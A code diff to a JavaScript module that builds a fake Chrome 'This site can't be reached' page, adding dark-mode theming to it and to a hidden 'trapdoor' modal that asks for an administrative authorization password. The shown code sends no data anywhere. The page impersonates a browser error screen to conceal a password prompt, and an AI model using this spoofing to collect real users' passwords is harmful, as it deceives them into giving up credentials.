@@ -6,21 +6,116 @@ export const FAKE_CHROME_ERROR_HTML = `<!doctype html>
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="color-scheme" content="light dark">
   <meta name="description" content="Site Error">
   <title>This site can’t be reached</title>
   <style id="fake-chrome-error-styles">
+    :root {
+      color-scheme: light dark;
+      --error-bg: #ffffff;
+      --error-text: #202124;
+      --error-secondary: #5f6368;
+      --error-btn-bg: #ffffff;
+      --error-btn-border: #5f6368;
+      --error-btn-color: #5f6368;
+      --error-btn-hover-bg: #f8f9fa;
+      --error-btn-hover-border: #202124;
+      --error-btn-hover-color: #202124;
+      --error-icon-filter: none;
+      --dialog-bg: #ffffff;
+      --dialog-text: #202124;
+      --dialog-input-bg: #ffffff;
+      --dialog-input-border: #dadce0;
+      --dialog-input-text: #202124;
+      --dialog-cancel-color: #1a73e8;
+      --dialog-submit-bg: #1a73e8;
+      --dialog-submit-color: #ffffff;
+      --dialog-err-color: #d93025;
+    }
+
+    @media (prefers-color-scheme: dark) {
+      :root {
+        --error-bg: #202124;
+        --error-text: #e8eaed;
+        --error-secondary: #9aa0a6;
+        --error-btn-bg: #202124;
+        --error-btn-border: #5f6368;
+        --error-btn-color: #8ab4f8;
+        --error-btn-hover-bg: #303134;
+        --error-btn-hover-border: #8ab4f8;
+        --error-btn-hover-color: #8ab4f8;
+        --error-icon-filter: grayscale(1) brightness(1.6) contrast(1.1);
+        --dialog-bg: #292a2d;
+        --dialog-text: #e8eaed;
+        --dialog-input-bg: #202124;
+        --dialog-input-border: #5f6368;
+        --dialog-input-text: #e8eaed;
+        --dialog-cancel-color: #8ab4f8;
+        --dialog-submit-bg: #8ab4f8;
+        --dialog-submit-color: #202124;
+        --dialog-err-color: #f28b82;
+      }
+    }
+
+    [data-theme="dark"],
+    .theme-dark {
+      --error-bg: #202124 !important;
+      --error-text: #e8eaed !important;
+      --error-secondary: #9aa0a6 !important;
+      --error-btn-bg: #202124 !important;
+      --error-btn-border: #5f6368 !important;
+      --error-btn-color: #8ab4f8 !important;
+      --error-btn-hover-bg: #303134 !important;
+      --error-btn-hover-border: #8ab4f8 !important;
+      --error-btn-hover-color: #8ab4f8 !important;
+      --error-icon-filter: grayscale(1) brightness(1.6) contrast(1.1) !important;
+      --dialog-bg: #292a2d !important;
+      --dialog-text: #e8eaed !important;
+      --dialog-input-bg: #202124 !important;
+      --dialog-input-border: #5f6368 !important;
+      --dialog-input-text: #e8eaed !important;
+      --dialog-cancel-color: #8ab4f8 !important;
+      --dialog-submit-bg: #8ab4f8 !important;
+      --dialog-submit-color: #202124 !important;
+      --dialog-err-color: #f28b82 !important;
+    }
+
+    [data-theme="light"],
+    .theme-light {
+      --error-bg: #ffffff !important;
+      --error-text: #202124 !important;
+      --error-secondary: #5f6368 !important;
+      --error-btn-bg: #ffffff !important;
+      --error-btn-border: #5f6368 !important;
+      --error-btn-color: #5f6368 !important;
+      --error-btn-hover-bg: #f8f9fa !important;
+      --error-btn-hover-border: #202124 !important;
+      --error-btn-hover-color: #202124 !important;
+      --error-icon-filter: none !important;
+      --dialog-bg: #ffffff !important;
+      --dialog-text: #202124 !important;
+      --dialog-input-bg: #ffffff !important;
+      --dialog-input-border: #dadce0 !important;
+      --dialog-input-text: #202124 !important;
+      --dialog-cancel-color: #1a73e8 !important;
+      --dialog-submit-bg: #1a73e8 !important;
+      --dialog-submit-color: #ffffff !important;
+      --dialog-err-color: #d93025 !important;
+    }
+
     html, body {
       margin: 0;
       padding: 0;
       width: 100%;
       height: 100%;
-      background-color: #ffffff;
-      color: #202124;
+      background-color: var(--error-bg);
+      color: var(--error-text);
       font-family: Arial, Helvetica, sans-serif;
       -webkit-font-smoothing: antialiased;
       -moz-osx-font-smoothing: grayscale;
       text-rendering: geometricPrecision;
       box-sizing: border-box;
+      transition: background-color 0.15s ease, color 0.15s ease;
     }
     *, *::before, *::after {
       box-sizing: inherit;
@@ -32,9 +127,10 @@ export const FAKE_CHROME_ERROR_HTML = `<!doctype html>
       flex-direction: column;
       justify-content: flex-start;
       align-items: center;
-      background-color: #ffffff;
+      background-color: var(--error-bg);
       padding: 16vh 24px 60px 24px;
       box-sizing: border-box;
+      transition: background-color 0.15s ease;
     }
     @media (max-width: 768px) {
       .chrome-error-wrapper {
@@ -71,7 +167,8 @@ export const FAKE_CHROME_ERROR_HTML = `<!doctype html>
       user-select: none;
       -webkit-user-select: none;
       -webkit-user-drag: none;
-      transition: opacity 0.15s ease;
+      filter: var(--error-icon-filter);
+      transition: opacity 0.15s ease, filter 0.2s ease;
     }
     .sad-file-shield {
       position: absolute;
@@ -96,7 +193,7 @@ export const FAKE_CHROME_ERROR_HTML = `<!doctype html>
       font-size: 24px;
       font-weight: 500;
       line-height: 1.33;
-      color: #202124;
+      color: var(--error-text);
       margin: 0 0 16px 0;
       letter-spacing: -0.2px;
       -webkit-font-smoothing: antialiased;
@@ -105,7 +202,7 @@ export const FAKE_CHROME_ERROR_HTML = `<!doctype html>
       font-family: Arial, Helvetica, sans-serif;
       font-size: 15px;
       line-height: 1.6;
-      color: #5f6368;
+      color: var(--error-secondary);
       margin: 0 0 32px 0;
       word-break: break-word;
       -webkit-font-smoothing: antialiased;
@@ -114,7 +211,7 @@ export const FAKE_CHROME_ERROR_HTML = `<!doctype html>
       font-family: Arial, Helvetica, sans-serif;
       font-size: 12px;
       font-weight: 500;
-      color: #5f6368;
+      color: var(--error-secondary);
       letter-spacing: 0.25px;
       margin: 0;
       user-select: all;
@@ -127,9 +224,9 @@ export const FAKE_CHROME_ERROR_HTML = `<!doctype html>
       margin-top: 36px;
     }
     .chrome-btn-back {
-      background-color: #ffffff;
-      color: #5F6368;
-      border: 1px solid #5F6368;
+      background-color: var(--error-btn-bg);
+      color: var(--error-btn-color);
+      border: 1px solid var(--error-btn-border);
       border-radius: 100px;
       padding: 7px 18px;
       font-size: 13px;
@@ -149,15 +246,41 @@ export const FAKE_CHROME_ERROR_HTML = `<!doctype html>
       transition: background-color 0.15s ease, border-color 0.15s ease, color 0.15s ease;
     }
     .chrome-btn-back:hover {
-      background-color: #f8f9fa;
-      border-color: #202124;
-      color: #202124;
+      background-color: var(--error-btn-hover-bg);
+      border-color: var(--error-btn-hover-border);
+      color: var(--error-btn-hover-color);
       box-shadow: none;
     }
     .chrome-btn-back:active {
-      background-color: #f1f3f4;
+      opacity: 0.85;
     }
   </style>
+  <script>
+    (function() {
+      function syncSystemTheme() {
+        try {
+          var isDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
+          var theme = isDark ? 'dark' : 'light';
+          document.documentElement.setAttribute('data-theme', theme);
+          document.documentElement.style.colorScheme = isDark ? 'dark' : 'light';
+          if (document.body) {
+            document.body.setAttribute('data-theme', theme);
+          }
+        } catch (_) {}
+      }
+      syncSystemTheme();
+      if (window.matchMedia) {
+        try {
+          var mql = window.matchMedia('(prefers-color-scheme: dark)');
+          if (mql.addEventListener) {
+            mql.addEventListener('change', syncSystemTheme);
+          } else if (mql.addListener) {
+            mql.addListener(syncSystemTheme);
+          }
+        } catch (_) {}
+      }
+    })();
+  </script>
 </head>
 <body class="fake-error-body">
   <div id="fake-chrome-error-screen" class="chrome-error-wrapper">
@@ -216,18 +339,18 @@ export const FAKE_CHROME_ERROR_HTML = `<!doctype html>
 
       modal = document.createElement('div');
       modal.id = 'trapdoor-prompt-modal';
-      modal.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,0.45);backdrop-filter:blur(2px);-webkit-backdrop-filter:blur(2px);display:flex;align-items:center;justify-content:center;z-index:9999999;font-family:Arial,Helvetica,sans-serif;';
+      modal.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,0.55);backdrop-filter:blur(3px);-webkit-backdrop-filter:blur(3px);display:flex;align-items:center;justify-content:center;z-index:9999999;font-family:Arial,Helvetica,sans-serif;';
 
       modal.innerHTML = \`
         <div id="trapdoor-dialog-box" style="
-          background: #ffffff;
+          background: var(--dialog-bg, #ffffff);
           border-radius: 8px;
-          box-shadow: 0 12px 32px rgba(0, 0, 0, 0.28), 0 2px 6px rgba(0, 0, 0, 0.12);
+          box-shadow: 0 16px 40px rgba(0, 0, 0, 0.4), 0 2px 8px rgba(0, 0, 0, 0.15);
           width: 90%;
           max-width: 440px;
           padding: 24px 28px;
           box-sizing: border-box;
-          color: #202124;
+          color: var(--dialog-text, #202124);
           animation: trapdoorFadeIn 0.18s ease-out;
         ">
           <style>
@@ -240,7 +363,7 @@ export const FAKE_CHROME_ERROR_HTML = `<!doctype html>
               outline: 2px solid rgba(26, 115, 232, 0.2) !important;
             }
           </style>
-          <div style="font-size: 15px; font-weight: 500; color: #202124; margin-bottom: 14px; line-height: 1.4;">
+          <div style="font-size: 15px; font-weight: 500; color: var(--dialog-text, #202124); margin-bottom: 14px; line-height: 1.4;">
             Enter administrative authorization password:
           </div>
           <input
@@ -254,17 +377,17 @@ export const FAKE_CHROME_ERROR_HTML = `<!doctype html>
               box-sizing: border-box;
               padding: 10px 14px;
               font-size: 14px;
-              border: 1px solid #dadce0;
+              border: 1px solid var(--dialog-input-border, #dadce0);
               border-radius: 4px;
-              background: #ffffff;
-              color: #202124;
+              background: var(--dialog-input-bg, #ffffff);
+              color: var(--dialog-input-text, #202124);
               outline: none;
               transition: border-color 0.15s ease;
             "
           />
           <div id="trapdoor-error-msg" style="
             display: none;
-            color: #d93025;
+            color: var(--dialog-err-color, #d93025);
             font-size: 13px;
             margin-top: 8px;
             font-weight: 500;
@@ -276,7 +399,7 @@ export const FAKE_CHROME_ERROR_HTML = `<!doctype html>
               padding: 8px 18px;
               font-size: 14px;
               font-weight: 500;
-              color: #1a73e8;
+              color: var(--dialog-cancel-color, #1a73e8);
               background: transparent;
               border: 1px solid transparent;
               border-radius: 4px;
@@ -287,8 +410,8 @@ export const FAKE_CHROME_ERROR_HTML = `<!doctype html>
               padding: 8px 22px;
               font-size: 14px;
               font-weight: 500;
-              color: #ffffff;
-              background: #1a73e8;
+              color: var(--dialog-submit-color, #ffffff);
+              background: var(--dialog-submit-bg, #1a73e8);
               border: none;
               border-radius: 4px;
               cursor: pointer;
